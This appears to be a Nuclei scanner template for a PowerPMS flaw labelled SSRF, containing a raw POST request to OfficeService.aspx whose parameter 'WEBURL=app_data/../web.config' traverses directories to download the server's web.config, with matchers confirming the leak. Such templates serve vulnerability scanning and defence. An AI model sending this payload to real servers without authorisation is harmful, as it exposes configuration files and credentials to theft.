id: powerpms-download-ssrf
info:
  name: PowerPMS download SSRF vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: ssrf
http:
  - raw:
      - |
        POST /PowerPlat/FormXml/DocFile/OfficeService.aspx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        action=download&WEBURL=app_data/../web.config
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "<configuration>"
          - "</system.web>"
          - "PowerControl"
        part: body
      - type: word
        words:
          - "filename=web.config"
        part: header
